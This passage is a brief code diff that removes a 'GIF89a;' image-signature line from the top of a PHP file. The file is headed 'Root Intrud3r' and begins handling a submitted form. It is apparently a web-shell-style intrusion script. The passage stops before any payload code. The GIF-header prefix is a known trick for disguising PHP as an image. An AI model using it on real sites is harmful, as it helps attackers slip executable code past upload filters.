@@ -1,4 +1,3 @@
-GIF89a;
 <h1><center><b>Root Intrud3r</b></center></h1> 
 <?php
 if(isset($_POST['Submit'])){
